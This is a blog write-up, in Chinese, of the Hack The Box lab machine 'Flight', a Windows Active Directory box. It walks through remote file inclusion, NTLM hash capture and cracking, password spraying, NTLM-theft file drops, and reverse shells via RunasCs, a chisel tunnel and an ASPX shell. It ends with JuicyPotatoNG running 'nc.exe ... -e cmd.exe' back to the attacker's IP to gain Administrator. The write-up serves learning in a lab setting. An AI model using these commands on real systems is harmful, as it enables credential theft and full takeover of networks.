---
title: HTB Flight
published: 2026-10-13
tags: [HTB,Windows,AD]
category: PenTest
draft: false
image: 'image.png'
---

## 前言

人生第一台 Hard AD 靶機，打完的感覺就是成就感滿滿，雖然中間有稍微卡關一下去看 write up ，但是整體而言打得很順，感覺自己好像有進步(?

## Recon

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/Desktop/htb/flight]
└─$ rustscan -a 10.129.228.120 -r 1-65535 -- -sC -sV -Pn              
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/dkri3c1/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.228.120:53
Open 10.129.228.120:80
Open 10.129.228.120:88
Open 10.129.228.120:135
Open 10.129.228.120:139
Open 10.129.228.120:389
Open 10.129.228.120:445
Open 10.129.228.120:464
Open 10.129.228.120:593
Open 10.129.228.120:636
Open 10.129.228.120:3269
Open 10.129.228.120:3268
Open 10.129.228.120:9389
Open 10.129.228.120:49667
Open 10.129.228.120:49674
Open 10.129.228.120:49673
Open 10.129.228.120:49692
Open 10.129.228.120:65113
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.129.228.120
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-07 22:29 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:29
Completed NSE at 22:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:29
Completed NSE at 22:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:29
Completed NSE at 22:29, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:29
Completed Parallel DNS resolution of 1 host. at 22:29, 0.26s elapsed
DNS resolution of 1 IPs took 0.26s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:29
Scanning 10.129.228.120 [18 ports]
Discovered open port 53/tcp on 10.129.228.120
Discovered open port 445/tcp on 10.129.228.120
Discovered open port 80/tcp on 10.129.228.120
Discovered open port 135/tcp on 10.129.228.120
Discovered open port 139/tcp on 10.129.228.120
Discovered open port 3269/tcp on 10.129.228.120
Discovered open port 49667/tcp on 10.129.228.120
Discovered open port 593/tcp on 10.129.228.120
Discovered open port 88/tcp on 10.129.228.120
Discovered open port 389/tcp on 10.129.228.120
Discovered open port 49673/tcp on 10.129.228.120
Discovered open port 3268/tcp on 10.129.228.120
Discovered open port 464/tcp on 10.129.228.120
Discovered open port 65113/tcp on 10.129.228.120
Discovered open port 636/tcp on 10.129.228.120
Discovered open port 49692/tcp on 10.129.228.120
Discovered open port 49674/tcp on 10.129.228.120
Discovered open port 9389/tcp on 10.129.228.120
Completed SYN Stealth Scan at 22:29, 0.61s elapsed (18 total ports)
Initiating Service scan at 22:29
Scanning 18 services on 10.129.228.120
Completed Service scan at 22:30, 56.18s elapsed (18 services on 1 host)
NSE: Script scanning 10.129.228.120.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:30
NSE Timing: About 99.96% done; ETC: 22:30 (0:00:00 remaining)
Completed NSE at 22:30, 40.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:30
Completed NSE at 22:31, 5.98s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:31
Completed NSE at 22:31, 0.00s elapsed
Nmap scan report for 10.129.228.120
Host is up, received user-set (0.30s latency).
Scanned at 2026-10-07 22:29:19 EDT for 103s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-10-08 09:28:23Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65113/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h58m55s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-08T09:29:17
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50845/tcp): CLEAN (Timeout)
|   Check 2 (port 32149/tcp): CLEAN (Timeout)
|   Check 3 (port 21917/udp): CLEAN (Timeout)
|   Check 4 (port 28337/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:31
Completed NSE at 22:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:31
Completed NSE at 22:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:31
Completed NSE at 22:31, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.38 seconds
           Raw packets sent: 18 (792B) | Rcvd: 18 (792B)
```

## Exploit

在 port 80 底下發現 dns name `flight.htb`

![Screenshot 2026-10-08 at 10.33.42 AM](https://hackmd.io/_uploads/SyZzZtVize.png)

加入 `/etc/hosts`

```bash=
127.0.0.1       localhost
127.0.1.1       dkri3c1

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.231.149 CICADA-DC.cicada.htb
10.129.228.120 flight.htb
```

對網頁做 dirsearch

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/Desktop/htb/flight]
└─$ dirsearch -u "10.129.228.120"               
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/dkri3c1/Desktop/htb/flight/reports/_10.129.228.120/_26-10-07_22-34-42.txt

Target: http://10.129.228.120/

[22:34:48] Starting: 
[22:34:54] 301 -  337B  - /js  ->  http://10.129.228.120/js/                
[22:34:54] 403 -  303B  - /%3f/                                             
[22:34:54] 403 -  303B  - /%C0%AE%C0%AE%C0%AF                               
[22:34:54] 403 -  303B  - /%ff                                              
[22:34:58] 403 -  303B  - /.ht_wsr.txt                                      
[22:34:58] 403 -  303B  - /.htaccess.bak1                                   
[22:34:58] 403 -  303B  - /.htaccess.save                                   
[22:34:58] 403 -  303B  - /.htaccess.orig                                   
[22:34:58] 403 -  303B  - /.htaccess.sample                                 
[22:34:58] 403 -  303B  - /.htaccess_orig                                   
[22:34:58] 403 -  303B  - /.htaccessOLD
[22:34:58] 403 -  303B  - /.htaccess_extra                                  
[22:34:58] 403 -  303B  - /.htaccessBAK
[22:34:58] 403 -  303B  - /.htaccess_sc
[22:34:58] 403 -  303B  - /.htaccessOLD2
[22:34:58] 403 -  303B  - /.htm                                             
[22:34:58] 403 -  303B  - /.html                                            
[22:34:58] 403 -  303B  - /.htpasswds
[22:34:58] 403 -  303B  - /.htpasswd_test                                   
[22:34:58] 403 -  303B  - /.httr-oauth                                      
[22:35:38] 403 -  303B  - /cgi-bin/                                         
[22:35:41] 200 -    2KB - /cgi-bin/printenv.pl                              
[22:35:42] 301 -  338B  - /css  ->  http://10.129.228.120/css/              
[22:35:48] 503 -  403B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[22:35:48] 503 -  403B  - /examples
[22:35:48] 503 -  403B  - /examples/websocket/index.xhtml
[22:35:48] 503 -  403B  - /examples/
[22:35:48] 503 -  403B  - /examples/servlet/SnoopServlet
[22:35:48] 503 -  403B  - /examples/jsp/snp/snoop.jsp
[22:35:48] 503 -  403B  - /examples/jsp/index.html
[22:35:48] 503 -  403B  - /examples/servlets/servlet/RequestHeaderExample
[22:35:48] 503 -  403B  - /examples/servlets/servlet/CookieExample
[22:35:48] 503 -  403B  - /examples/servlets/index.html
[22:35:51] 301 -  341B  - /images  ->  http://10.129.228.120/images/        
[22:35:52] 403 -  303B  - /index.php::$DATA                                 
[22:35:54] 200 -    5KB - /images/                                          
[22:35:57] 200 -    3KB - /js/                                              
[22:36:04] 403 -  422B  - /phpmyadmin                                       
[22:36:06] 403 -  422B  - /phpmyadmin/ChangeLog                             
[22:36:06] 403 -  422B  - /phpmyadmin/docs/html/index.html
[22:36:06] 403 -  422B  - /phpmyadmin/
[22:36:06] 403 -  422B  - /phpmyadmin/doc/html/index.html
[22:36:06] 403 -  422B  - /phpmyadmin/phpmyadmin/index.php                  
[22:36:06] 403 -  422B  - /phpmyadmin/scripts/setup.php                     
[22:36:06] 403 -  422B  - /phpmyadmin/index.php
[22:36:06] 403 -  422B  - /phpmyadmin/README
[22:36:10] 403 -  422B  - /server-info                                      
[22:36:10] 403 -  422B  - /server-status/                                   
[22:36:10] 403 -  422B  - /server-status                                    
[22:36:18] 403 -  303B  - /Trace.axd::$DATA                                 
[22:36:21] 403 -  303B  - /web.config::$DATA                                
[22:36:21] 403 -  422B  - /webalizer                                        
[22:36:22] 403 -  422B  - /webalizer/ 
```

path : `cgi-bin/printenv.pl`

![Screenshot 2026-10-08 at 10.54.28 AM (1)](https://hackmd.io/_uploads/SkbmIYEifx.png)

雖然是 Windows 又是 xampp ，但是 `cgi-bin.exe` 並沒有在 recon 的結果裡，所以先不考慮 `CVE-2024-4577`

繼續做 recon，fuzz virtual host

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/.ssh/php-cgi-Injector]
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb" --hl 154 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                          
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"                                                                         
000009532:   400        10 L     37 W       326 Ch      "#www"                                                                           
000010581:   400        10 L     37 W       326 Ch      "#mail"                                                                          

Total time: 0
Processed Requests: 19966
Filtered Requests: 19963
Requests/sec.: 0
```

把 `school.flight.htb` 加入 `/etc/hosts`

```bash=
127.0.0.1       localhost
127.0.1.1       dkri3c1

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.231.149 CICADA-DC.cicada.htb
10.129.228.120 flight.htb
10.129.228.120 school.flight.htb
```

![Screenshot 2026-10-08 at 11.27.04 AM](https://hackmd.io/_uploads/S1fcaK4sfx.png)

在網頁上發現參數 `view` ，對他做 LFI fuzzing，參考

https://hackviser.com/tactics/pentesting/web/lfi-rfi

找到 `http://school.flight.htb/index.php?view=C:\Windows\System32\drivers\etc\hosts` 發現他會擋，用 double url encode 也會被擋


![Screenshot 2026-10-08 at 11.32.23 AM](https://hackmd.io/_uploads/ryr0CYNoGe.png)

於是想測試看看 RFI

![image](https://hackmd.io/_uploads/Sy0LPftofe.png)

發現是有的

![image](https://hackmd.io/_uploads/BkrHvMKszx.png)

於是想利用他去戳一個 shell 出來，可以注意的點是我的檔案名稱是 `exp.txt`，但是因為 php 讀進來的時候是看裡面有沒有標籤並且執行

但很遺憾他還是沒有成功

![image](https://hackmd.io/_uploads/SJhVuMFszl.png)

但是細看 hackviser 可以發現 RFI 其實有其他 protocol 可以利用

![image](https://hackmd.io/_uploads/S162YztoMl.png)

先開一個共享 smb server

```bash=
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo impacket-smbserver -smb2support share $(pwd)
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
```

用 `\\` 去送 unc request ，但是被 WAF 擋了

![image](https://hackmd.io/_uploads/Sk5GaMYize.png)

後面改用 `//` 送就成功了，但是並不會執行到 reverse shell 的東西

![image](https://hackmd.io/_uploads/H1iPpGKofg.png)

後面想一想都可以送 unc request 了，為甚麼不開 responder 攔一下內容

![Screenshot 2026-10-13 at 9.28.53 AM](https://hackmd.io/_uploads/Hkvvt-jiGl.png)

成功拿到 NTLM hash，並且把他丟到 hashcat 上


![Screenshot 2026-10-13 at 9.31.11 AM](https://hackmd.io/_uploads/SJ1eqZojGg.png)


成功解出 `S??????`

![Screenshot 2026-10-13 at 9.31.50 AM](https://hackmd.io/_uploads/BJPMq-siMl.png)


用 `evil-winrm` 登入嘗試失敗

![Screenshot 2026-10-13 at 9.33.04 AM](https://hackmd.io/_uploads/BJjIcbsjGg.png)


感覺是要做 password spray，回頭用 ldapdomaindump 去把 user name 全部 dump 出來

```bash=
┌──(kali🐱kali)-[~/Desktop/htb/flight]
└─$ ldapdomaindump -u 'flight\svc_apache' -p '????' 10.129.228.120 -o .
```
file:`domain_users`

![image](https://hackmd.io/_uploads/Hy1uzXYszg.png)


加入 user.txt

![image](https://hackmd.io/_uploads/SJmLMXKiMg.png)

做 password spray

```
┌──(kali🐱kali)-[~/Desktop/htb/flight]
└─$ nxc winrm 10.129.228.120 -u user.txt -p '???'
WINRM       10.129.228.120  5985   G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)
WINRM       10.129.228.120  5985   G0               [-] flight.htb\Administrator:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\Guest:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\krbtgt:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\S.Moon:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\R.Cold:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\G.Lors:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\L.Kein:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\M.Gold:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\C.Bum:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\W.Walker:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\I.Francis:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\D.Truff:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\V.Stevens:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\svc_apache:???
WINRM       10.129.228.120  5985   G0               [-] flight.htb\O.Possum:???

┌──(kali🐱kali)-[~/Desktop/htb/flight]
└─$ nxc smb 10.129.228.120 -u user.txt -p '???'
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [-] flight.htb\Administrator:??? STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\Guest:??? STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\krbtgt:??? STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:???
```

發現 `S.Moon` 有料，繼續用這組 credentials 去看看可以登 smb 上那些資料夾的名稱

![Screenshot 2026-10-13 at 9.36.13 AM](https://hackmd.io/_uploads/Sk2GsWoiGe.png)


原本想說可以透過 `Shared` 上傳 reverse shell ，但是當我透過 msfvenom 把檔案弄好之後發現上傳不了，盲猜是 NTFS ACL 在搞鬼

```
smb: \> put a.exe
NT_STATUS_ACCESS_DENIED opening remote file \a.exe
```

轉頭去把剛剛 smb dump 的所有檔案都看一遍

```bash=
smb: \svc_apache\> cd ..
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

翻完檔案實在沒有想法ㄌ，就去看 writes up QQ

用到一招 `NTLM Theft` ，而他與 `LLMNR Poisoning` 的不同是 `LLMNR Poisoning` 是偽造 `LLMNR` 名稱解析回覆，將受害端導向攻擊者主機；受害端之後可能透過 SMB 進行 NTLM 驗證。
`NTLM Theft` 則是透過 `UNC` 誘使受害端對攻擊者主機進行 `NTLM` 驗證，進而取得 `NetNTLM challenge-response`，其實在一開始的時候我以為是 LLMNR 去撈到 `apache_svc` 的 `NTLMv2`，但其實他本質也是 `NTLM Theft`

用 

https://github.com/Greenwolf/ntlm_theft

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/Desktop/htb/flight/ntlm_theft]
└─$ ntlm_theft -g modern -s 10.10.14.85 -f exploit
```

然後連上 smb 對他做 recurse

```bash=
smb: \> recurse 
smb: \> prompt off
smb: \> mput *
smb: \> ls
  .                                   D        0  Mon Oct 12 12:24:12 2026
  ..                                  D        0  Mon Oct 12 12:24:12 2026
  exploit-(fulldocx).xml              A    72585  Mon Oct 12 12:24:08 2026
  exploit-(stylesheet).xml            A      163  Mon Oct 12 12:24:09 2026
  exploit.application                 A     1531  Mon Oct 12 12:24:08 2026
  exploit.jnlp                        A      192  Mon Oct 12 12:24:11 2026
  exploit.library-ms                  A     1219  Mon Oct 12 12:24:12 2026
  exploit.odt                         A     6492  Mon Oct 12 12:24:12 2026
  exploit.theme                       A     1660  Mon Oct 12 12:24:10 2026

		5056511 blocks of size 4096. 1213433 blocks available
```


responder:
```bash=
sudo responder -I tun0
```
![Screenshot 2026-10-12 at 5.56.01 PM](https://hackmd.io/_uploads/HyyaRQqsMx.png)

回想起來猜測可能是 ACL 規定有一些檔案不能上傳，然後發現上傳之後 server 端可能會執行上傳的內容並且把它刪掉，拿到 c.bum 的 NTLMv2 之後那去 hashcat 解

```bash=                   
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt  
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu--0x000, 2940/5880 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (5197 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

C.BUM::flight.htb:????:??????
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: C.BUM::flight.htb:bce858886914789d:44d94c529c180050...000000
Time.Started.....: Mon Oct 12 05:57:48 2026 (4 secs)
Time.Estimated...: Mon Oct 12 05:57:52 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2653.7 kH/s (1.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tioncurtis23 -> Thelittlemermaid
Hardware.Mon.#01.: Util: 88%

Started: Mon Oct 12 05:57:47 2026
Stopped: Mon Oct 12 05:57:52 2026
```

因為 `evil-winrm` 無法登入，所以用 `smbclient` 登，而登之前先看一下這一組 credential 跟剛剛能做的有沒有不一樣，發現在 `Web` 上多了 `Read` 跟 `Write` 的權限


![Screenshot 2026-10-13 at 9.37.45 AM](https://hackmd.io/_uploads/HyQ_oWioMe.png)


先 `smbclient` 到 `Users` 

在 `\\10.129.54.89\Users\C.Bum\Desktop\` 上找到 user flag


![image](https://hackmd.io/_uploads/BJBjLw9jfx.png)

現在的目標是要拿一個 reverse shell ，因此連上 `Web` 的資料夾

在 https://www.revshells.com/ 先找 Windows 的 php webshell

![image](https://hackmd.io/_uploads/ByCWMu9sMe.png)

開完之後用 powershell 把她彈成 reverse shell

![image](https://hackmd.io/_uploads/r1wNz_cjfl.png)


在 attacker 上 `nc` 之後會發現他的權限是 `svc_apache`，且沒有可以利用的面向，因此現在的目標變成切換使用者到 `C.Bum`

![image](https://hackmd.io/_uploads/r1_b9dqizg.png)


![image](https://hackmd.io/_uploads/r1G8Md5jGl.png)

找到

https://exploitnotes.org/exploit/windows/privilege-escalation/switch-user#runascs

可以用 runas 

https://github.com/antonioCoco/RunasCs

先把他載下來，然後在 Windows 上編譯，之後把它傳到 kali 裡面，然後在 `kali` 裡面掛 `python http server`，因為 `curl` 被 ban ，所以我在 `Windows` 上用 `powershell` 的 `Invoke-WebRequest`

```
SHELL>  Invoke-WebRequest -Uri "http://10.10.14.85:878/RunasCs.exe" -OutFile "runas.exe"
SHELL> ./runas.exe C.bum ???? cmd -r 10.10.14.85:777
[-] RunasCsException: WSAConnect failed with error code: 10061
SHELL> ./runas.exe C.bum ????? cmd -r 10.10.14.85:7777
[*] Warning: The logon for user 'C.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-74e86$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 4448 created in background.
SHELL>
 ```

之後在 kali 上 `nc` 對應的 port ，便可拿到 `c.bum` 的權限

![image](https://hackmd.io/_uploads/r13gtd9jfe.png)

切完使用者之後發現也沒有可以利用的點

![image](https://hackmd.io/_uploads/SJi19O5jMe.png)

看看 `netstat -a`

![image](https://hackmd.io/_uploads/B1IsgYqjze.png)

發現比當初 Recon 的點多了 port 5985 、8000

用 `Invoke-webrequest` 去看發現 5985 沒東西

![image](https://hackmd.io/_uploads/SkJRbtqsfe.png)


用 chisel 打 port forwarding 

Windows:

```bash=
SHELL> .\chisel.exe client http://10.10.14.85:8000 R:9000:127.0.0.1:8000
```

Linux:
```bash=
┌──(kali🐱kali)-[~/Downloads/my_pt_tools/proxy/chisel]
└─$ ./chisel_1.12.0_linux_amd64 server --reverse --port 8000
2026/10/12 12:21:07 server: Reverse tunnelling enabled
2026/10/12 12:21:07 server: Fingerprint ezmGdUALPmuiQy0uHO4+37azsztUEuLE7FaZs0rlk/U=
2026/10/12 12:21:07 server: Listening on http://0.0.0.0:8000
2026/10/12 12:32:18 server: session#13: Open (user=- addr=10.129.228.120:54053 remotes=R:0.0.0.0:9000:127.0.0.1:8000)
2026/10/12 12:32:18 server: session#13: tun: proxy#R:9000=>8000: Listening
```



![image](https://hackmd.io/_uploads/ByQe3Y5oGg.png)


看起來是 `asp.net` framework，而存放 Windows IIS 的 path 是 `C:\inetpub\development`

找到 https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

![image](https://hackmd.io/_uploads/BkLel55sfl.png)

用 `C.Bum` 的權限上傳 `shell.aspx` 到 `C:\inetpub\development`

![image](https://hackmd.io/_uploads/S1gQX99izl.png)

看到 `SeImpersonatePrivilege`

```bash=
PS C:\windows\system32\inetsrv> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv>
```

對照前面 systeminfo 的結果，於是想打 juicypotatoNG ，於是把檔案都載到 `C:\xampp\htdocs\flight.htb>` 然後執行

```bash=
PS C:\xampp\htdocs\flight.htb> ls
ls


    Directory: C:\xampp\htdocs\flight.htb


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/12/2026   5:17 PM                css
d-----       10/12/2026   5:17 PM                images
d-----       10/12/2026   5:17 PM                js
-a----       10/12/2026   4:13 PM       11954176 chisel.exe
-a----       10/12/2026   4:10 PM            349 exp.php
-a----       10/12/2026   4:28 PM            349 exp2.php
-a----       10/12/2026   4:45 PM            349 exp3.php
-a----        2/23/2022   9:58 PM           7069 index.html
-a----       10/12/2026   5:17 PM          38616 nc.exe
-a----       10/12/2026   5:18 PM         153600 NG.exe


PS C:\xampp\htdocs\flight.htb> ./NG.exe -t * -p nc.exe -a "10.10.14.85 5555 -e cmd.exe"
./NG.exe -t * -p nc.exe -a "10.10.14.85 5555 -e cmd.exe"
PS C:\xampp\htdocs\flight.htb>
```

成功取得 Administrator

![image](https://hackmd.io/_uploads/HkAUwccsMg.png)

在 `C:\Users\Administrator\Desktop` 上找到 root flag


## Pwned!

![image](https://hackmd.io/_uploads/B1acv9qozg.png)
